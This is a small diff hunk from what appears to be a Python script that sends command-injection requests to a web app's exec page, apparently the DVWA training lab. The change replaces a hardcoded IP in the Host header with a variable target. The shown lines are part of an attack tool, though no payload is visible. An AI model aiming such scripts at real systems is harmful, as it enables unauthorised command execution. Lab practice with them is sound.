@@ -21,7 +21,7 @@ command = urllib.pathname2url(data)
 
 payload = """
 POST /vulnerabilities/exec/index.php HTTP/1.1
-Host: 192.168.1.105
+Host: """ + target + """
 Content-Length: 147
 Cache-Control: max-age=0
 Origin: http://""" + target + """
